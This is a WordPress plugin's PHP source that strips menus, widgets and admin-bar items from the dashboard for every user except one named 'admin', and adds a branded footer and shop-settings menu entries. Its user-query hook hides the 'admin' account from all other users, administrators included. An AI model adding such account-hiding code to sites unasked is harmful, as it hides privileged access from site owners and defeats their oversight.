<?php
/*
Plugin Name: Clean Dash
Plugin URI: http://shaktisaurav.com/
Description: Clean Dashboard for WordPress - Removes Error Messages, Updates, And Many Non Admin Things for all user except ADMIN(admin)
Author: Shakti Saurav
Version: 1.0
Author URI: http://shaktisaurav.com
*/

include_once(ABSPATH . 'wp-includes/pluggable.php');

//Hide User
function site_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ($username == 'admin') {
	}
	else {
		global $wpdb;
   		 $user_search->query_where = str_replace('WHERE 1=1',
     	 "WHERE 1=1 AND {$wpdb->users}.user_login != 'admin'",$user_search->query_where);
  }
}
add_action('pre_user_query','site_pre_user_query');

//Default Color Scheme
function set_default_admin_color($user_id) {
    $args = array(
        'ID' => $user_id,
        'admin_color' => 'modern'
    );
    wp_update_user( $args );
}
add_action('user_register', 'set_default_admin_color');

//Prevent Non Admin User From Changing Color Scheme
if ( !current_user_can('manage_options') )
remove_action( 'admin_color_scheme_picker', 'admin_color_scheme_picker' );

//Remove Things from WP Admin Bar
function removeFromWPBar($wp_admin_bar) {
	$wp_admin_bar->remove_node('si_menu');
	$wp_admin_bar->remove_node('updates');
	$wp_admin_bar->remove_node('comments');
    $wp_admin_bar->remove_node('new-content');
    $wp_admin_bar->remove_node('xtemos_options');
  //$wp_admin_bar->remove_node('wp-logo');
  //$wp_admin_bar->remove_node('site-name');
  //$wp_admin_bar->remove_node('my-account');
  //$wp_admin_bar->remove_node('search');
  //$wp_admin_bar->remove_node('customize');
    $wp_admin_bar->remove_node('wp-logo');
}
add_action('admin_bar_menu', 'removeFromWPBar', 999);


//Hide WP Bar On Frontend
show_admin_bar(false);

//Custom Footer
function customFoot(){
?>
<style>@media(max-width:600px){.pc{font-size: 12px!important}}</style>
<div class="pc" style="background-color: #fff; color: #222; font-size: 15px; padding: 5px">
<center>
 All Rights Reserved |&nbsp; <?php echo date('Y').'&nbsp;'; bloginfo( 'name' ); ?> | Powered By <a href="" style="color:#222">Clean Dash</a>
</center>	
</div>
<?php
};
add_action('wp_footer', 'customFoot');

//Login Logo
function my_login_logo() { ?>
    <style type="text/css">
        #login h1 a, .login h1 a {
            background-image: url('https://www.logo_image_url_here.com');
            padding-bottom: 30px;
        }
    </style>
<?php
}
add_action( 'login_enqueue_scripts', 'my_login_logo');

//Get Current User
$current_user = wp_get_current_user();
$username = $current_user->user_login;

if($username=='admin'){
	
}
else{
    
//Add Style for Clean Look
function themeCSS() {
	wp_enqueue_style('my-admin-theme', plugins_url('custom.css', __FILE__));
}
add_action('admin_enqueue_scripts', 'themeCSS');
add_action('login_enqueue_scripts', 'themeCSS');	

//Remove Bloatwares xD
function removeWPMenu() {                   
    remove_menu_page( 'edit.php?post_type=static_block' );  
    remove_menu_page( 'edit.php?post_type=basel_slide' );  
	remove_menu_page( 'edit.php?post_type=basel_sidebar' ); 
	remove_menu_page( 'edit.php?post_type=cms_block' );     
	remove_menu_page( 'edit.php?post_type=basel_size_guide' );  
	remove_menu_page( 'edit.php?post_type=portfolio' );  
	remove_menu_page( 'admin.php?page=afrsm-pro-list' );  
	remove_menu_page( 'edit-comments.php' );         
	remove_menu_page( 'themes.php' );                 
	remove_menu_page( 'plugins.php' );                 
	remove_menu_page( 'tools.php' );                
	remove_menu_page( 'options-general.php' );  
	remove_menu_page( 'admin.php' );
	remove_menu_page( 'pwa-for-wp' ); 
	remove_menu_page( 'rnlab-app-control' ); 
	remove_menu_page( 'wcfm-license' ); 
	remove_menu_page( 'afrsm-pro-list' ); 
	}
add_action( 'admin_menu', 'removeWPMenu', 999 );
	
function removeWPMenu2(){   
    remove_menu_page( 'vc-general' );  
    remove_menu_page( 'woocommerce' ); 
    remove_menu_page( 'wpforms-overview' );    
    remove_menu_page( 'yith' );   
    remove_menu_page( 'envato' ); 
    remove_menu_page( 'envato-market' );  
    remove_menu_page( 'cms_block' );  
    remove_menu_page( 'theme_options' );  
    remove_menu_page( 'wcfm_settings' ); 
    remove_menu_page( 'theme_options' ); 
    remove_menu_page( 'wpfastestcacheoptions' );  
    remove_menu_page( 'yith_plugin_panel' );  
//  remove_menu_page( 'revslider' ); 
    remove_menu_page( 'woo-variation-swatches-settings' ); 	
    remove_menu_page( 'woo-orders-tracking' ); 
    remove_menu_page( 'index.php' ); 
    remove_menu_page( 'xtemos_options' ); 
    remove_menu_page( 'wpseo_dashboard' ); 
    remove_menu_page( 'mailchimp-for-wp' ); 
    remove_menu_page( 'pgs-woo-api-settings' ); 
    remove_menu_page( 'basel_dashboard' );
    remove_menu_page( 'wpcf7' );
    remove_menu_page( 'wpam-affiliates' );
    remove_menu_page( 'wc-admin&path=/marketing' ); 
    remove_menu_page( 'WP-Optimize' ); 
    remove_menu_page( 'duplicator' );
    remove_menu_page( 'dots_store' ); 
}
add_action( 'admin_init', 'removeWPMenu2' );

//Add Menu Pages
function AddWPMenu() {
    add_menu_page( 'About Store', 'About Store', 'manage_options', 'admin.php?page=wc-settings', '', 'dashicons-admin-multisite', 1 );
	add_menu_page( 'Shipping Zones', 'Shipping Zones', 'manage_options', 'admin.php?page=wc-settings&tab=shipping', '', 'dashicons-cart', 11 );
	add_menu_page( 'Tax & Other Rates', 'Tax & Other Rates', 'manage_options', 'admin.php?page=wc-settings&tab=tax&section=standard', '', 'dashicons-flag', 11 );
	add_menu_page( 'Payment Settings', 'Payment Settings', 'manage_options', 'admin.php?page=wc-settings&tab=checkout', '', 'dashicons-flag', 11 ); 
    add_menu_page( 'Menu', 'Menu', 'manage_options', 'nav-menus.php', '', 'dashicons-tickets-alt', 12 );
	add_menu_page( 'Widgets', 'Widgets', 'manage_options', 'widgets.php', '', 'dashicons-editor-paste-word', 12 );
	add_menu_page( 'Orders', 'Orders', 'manage_options', 'edit.php?post_type=shop_order', '', 'dashicons-megaphone', 25 );
	add_menu_page( 'Coupons', 'Coupons', 'manage_options', 'edit.php?post_type=shop_coupon', '', 'dashicons-tag', 25 );
}
add_action( 'admin_menu', 'AddWPMenu' );

//Disable Dashboard Widgets
function disableDefaultWidgets() {
    global $wp_meta_boxes;
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
	unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_recent_drafts']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['bbp-dashboard-right-now']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['yoast_db_widget']);
	unset($wp_meta_boxes['dashboard']['normal']['core']['rg_forms_dashboard']);
}
add_action('wp_dashboard_setup', 'disableDefaultWidgets', 999);

//Add Custom Welcome Dashboard Widget
function add_custom_dashboard_widgets() {
    wp_add_dashboard_widget(								 
		'custom_dashboard_widget', // Widget slug.
        'My Dashboard', // Title.
        'dashboard_widget_content' // Display function.
	);
}

add_action( 'wp_dashboard_setup', 'add_custom_dashboard_widgets' );
	function dashboard_widget_content() {
	    echo bloginfo( 'name' )." :Hello there, Welcome! Any Custom Message here.";
	}
}
?>